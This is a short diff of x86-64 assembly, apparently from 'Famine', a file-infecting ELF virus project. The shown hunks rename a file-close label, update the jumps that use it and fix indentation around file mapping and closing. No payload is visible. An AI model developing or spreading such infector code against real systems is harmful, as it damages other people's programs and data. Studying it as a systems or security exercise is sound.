@@ -150,7 +150,7 @@ _check_file:
 		mov rdx, SEEK_END
 		syscall
 		cmp rax, 0x0
-		jle _close_file
+		jle _close_file_inf
 		mov INF(infection.map_size), rax
 
 	_map_file:
@@ -164,7 +164,7 @@ _check_file:
 		mov r9, 0x0
 		syscall
 		cmp	rax, 0x0								; rax -> map (used later)
-		jl _close_file
+		jl _close_file_inf
 		lea r8, INF(infection.map)
 		mov [r8], rax
 
@@ -311,9 +311,9 @@ _unmap_close_inf:
 	lea rsi, INF(infection.map_size)
 	mov rax, SYS_UNMAP
 	syscall
-	jmp _close_file
+	jmp _close_file_inf
 
-_close_file:
+_close_file_inf:
 	mov	rax, SYS_CLOSE
 	mov	rdi, INF(infection.file_fd)
 	syscall
@@ -321,11 +321,11 @@ _close_file:
 	jmp _leave_return
 
 _returnReadir:
-    mov rdi, FAM(famine.fd)
+	mov rdi, FAM(famine.fd)
 	cmp rdi, 0
 	jle	_leave_return
-    mov rax, SYS_CLOSE
-    syscall
+	mov rax, SYS_CLOSE
+	syscall
 	or qword FAM(famine.fd), -1
 	jmp _leave_return
 
